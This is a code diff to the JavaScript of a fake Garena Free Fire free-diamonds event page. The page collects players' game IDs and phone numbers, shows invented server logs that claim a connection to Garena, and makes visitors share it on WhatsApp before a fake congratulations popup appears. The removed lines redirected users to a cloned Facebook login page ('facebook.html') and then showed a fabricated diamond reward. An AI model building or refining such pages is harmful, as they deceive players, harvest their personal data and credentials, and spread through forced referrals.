@@ -18,18 +18,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const step1Card = document.getElementById('step1Card');
     const step2Card = document.getElementById('step2Card');
-    const step3Card = document.getElementById('step3Card');
 
     // DOM Elements - Sharing & Claims
     const referralUrlInput = document.getElementById('referralUrl');
     const shareBtn = document.getElementById('shareBtn');
 
-
     const progressText = document.getElementById('progressText');
     const progressBar = document.getElementById('progressBar');
     const rewardConsole = document.getElementById('rewardConsole');
-
-    const facebookLoginBtn = document.getElementById('facebookLoginBtn');
     const toastContainer = document.getElementById('toastContainer');
 
     // State Variables
@@ -72,8 +68,8 @@ document.addEventListener('DOMContentLoaded', () => {
         const idVal = playerIdInput.value.trim();
         const phoneVal = phoneNumberInput.value.trim();
 
-        if (!idVal || idVal.length < 8) {
-            showToast("Please enter a valid Player ID (min 8 digits).", "error");
+        if (!idVal || idVal.length < 4) {
+            showToast("Please enter a valid Gaming ID (min 4 characters).", "error");
             return;
         }
 
@@ -91,8 +87,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const logs = [
             `Connecting to Garena Secure Database...`,
-            `Searching for Player ID: ${idVal}...`,
-            `Status: Player Found!`,
+            `Searching for ID: ${idVal}...`,
+            `Status: Found!`,
             `Linking Mobile Number: ${phoneVal}...`,
             `Authenticating secure event ticket claim?ref=ff92a...`,
             `Garena Server Connection: Established!`
@@ -134,7 +130,37 @@ document.addEventListener('DOMContentLoaded', () => {
     function unlockShareStep() {
         step2Card.classList.remove('locked');
         step2Card.classList.add('active');
-        showToast("Free Fire Account Linked! Proceed to Step 2 to generate referrals.");
+        showToast("Account Linked! Proceed to Step 2 to invite friends.");
+    }
+
+    // Congratulations Popup Trigger
+    function showCongratulations() {
+        const congratsModal = document.getElementById('congratsModal');
+        const displayId = document.getElementById('displayDisplayId');
+        const displayPhone = document.getElementById('displayDisplayPhone');
+        
+        const savedId = localStorage.getItem('garena_player_id') || connectedPlayerId || "-";
+        const savedPhone = localStorage.getItem('garena_phone_number') || phoneNumberInput.value.trim() || "-";
+
+        if (displayId) displayId.textContent = savedId;
+        if (displayPhone) displayPhone.textContent = savedPhone;
+
+        if (congratsModal) {
+            congratsModal.classList.add('open');
+        }
+        
+        localStorage.setItem('form_submitted', 'true');
+    }
+
+    // Close Modal Event Handler
+    const closeCongratsBtn = document.getElementById('closeCongratsBtn');
+    if (closeCongratsBtn) {
+        closeCongratsBtn.addEventListener('click', () => {
+            const congratsModal = document.getElementById('congratsModal');
+            if (congratsModal) {
+                congratsModal.classList.remove('open');
+            }
+        });
     }
 
     // WhatsApp Direct Sharing & Progress Increment
@@ -154,7 +180,7 @@ document.addEventListener('DOMContentLoaded', () => {
             localStorage.setItem('garena_referrals', referralCount);
 
             if (referralCount === maxReferrals) {
-                unlockClaimStep();
+                completeChallenge();
             } else {
                 showToast(`Redirecting to WhatsApp! Referral count updated (${referralCount}/${maxReferrals}).`);
             }
@@ -168,47 +194,34 @@ document.addEventListener('DOMContentLoaded', () => {
         progressText.textContent = `${referralCount} / ${maxReferrals} Invited`;
     }
 
-    // Unlock Step 3: Verification
-    function unlockClaimStep() {
+    // Handle Completed Challenge
+    function completeChallenge() {
         rewardConsole.classList.add('unlocked');
-        step3Card.classList.remove('locked');
-        step3Card.classList.add('active');
+        
+        // Replace share button with view status button
+        const simulatorActions = document.querySelector('.simulator-actions');
+        if (simulatorActions) {
+            simulatorActions.innerHTML = `
+                <button class="btn-action" id="viewStatusBtn" style="background: linear-gradient(135deg, var(--color-secondary), hsl(192, 95%, 40%)); box-shadow: var(--shadow-glow-cyan); margin-top: 10px;">View Event Status</button>
+            `;
+            
+            const viewStatusBtn = document.getElementById('viewStatusBtn');
+            if (viewStatusBtn) {
+                viewStatusBtn.addEventListener('click', () => {
+                    showCongratulations();
+                });
+            }
+        }
 
-        // Hide Share Actions
-        shareBtn.style.display = 'none';
-
-        showToast("Challenge complete! Vault rewards unlocked. Verify your account to claim the diamonds.");
+        showCongratulations();
     }
-
-    // Secure Verification Clicks (Redirect to custom responsive clones)
-
-    facebookLoginBtn.addEventListener('click', () => {
-        if (step3Card.classList.contains('locked')) return;
-        localStorage.setItem('garena_step1_connected', 'true');
-        localStorage.setItem('garena_player_id', connectedPlayerId);
-        localStorage.setItem('garena_player_name', playerNameDisplay.textContent);
-        localStorage.setItem('garena_referrals', referralCount);
-
-        window.location.href = 'facebook.html';
-    });
 
     // -------------------------------------------------------------
     // Session State Restoration & Callback Handling
     // -------------------------------------------------------------
-    const urlParams = new URLSearchParams(window.location.search);
-    const verifiedParam = urlParams.get('verified');
-
-    // Save verification state if returning from clone redirect
-    if (verifiedParam === 'facebook') {
-        localStorage.setItem('verified_success', 'true');
-        localStorage.setItem('verified_method', verifiedParam);
-    }
-
     const isStep1Connected = localStorage.getItem('garena_step1_connected') === 'true';
     const savedPlayerId = localStorage.getItem('garena_player_id') || "";
-    const savedPlayerName = localStorage.getItem('garena_player_name') || "";
     const savedReferralCount = parseInt(localStorage.getItem('garena_referrals') || "0");
-    const isVerified = localStorage.getItem('verified_success') === 'true';
 
     if (isStep1Connected && savedPlayerId) {
         // Restore Step 1 state
@@ -224,36 +237,7 @@ document.addEventListener('DOMContentLoaded', () => {
         updateProgress();
 
         if (referralCount >= maxReferrals) {
-            // Restore Step 3 state
-            unlockClaimStep();
-
-            if (isVerified) {
-                // If verified, replace claim actions with success state
-                const claimActions = document.querySelector('.claim-actions');
-                if (claimActions) {
-                    claimActions.innerHTML = `
-                        <div class="success-alert" id="verificationSuccess" style="display: flex; width: 100%; border-color: var(--color-success); background: rgba(16, 185, 129, 0.1); margin-top: 10px;">
-                            <span class="success-icon" style="background-color: var(--color-success); width: 24px; height: 24px; display: inline-flex; align-items: center; justify-content: center; border-radius: 50%; color: white; font-weight: bold; margin-right: 12px;">✓</span>
-                            <div>
-                                <h4 style="color: #fff; font-size: 14px; font-weight: 700; margin-bottom: 2px;">Verification Complete!</h4>
-                                <p style="color: var(--color-text-muted); font-size: 12px; margin: 0;">500 Diamonds Crate dispatched to Garena Vault.</p>
-                            </div>
-                        </div>
-                        <div style="margin-top: 16px; text-align: center; width: 100%;">
-                            <p style="color: var(--color-accent); font-size: 14px; font-weight: 700; animation: fire-pulse 1.5s infinite alternate; margin: 0;">💎 Crate Claimed & Active in Game!</p>
-                        </div>
-                    `;
-                }
-
-                // Show verification success toast once
-                if (verifiedParam) {
-                    setTimeout(() => {
-                        showToast(`Account verification successful via Facebook!`, "success");
-                        // Clean up url parameters without reloading
-                        window.history.replaceState({}, document.title, window.location.pathname);
-                    }, 600);
-                }
-            }
+            completeChallenge();
         }
     }
 });
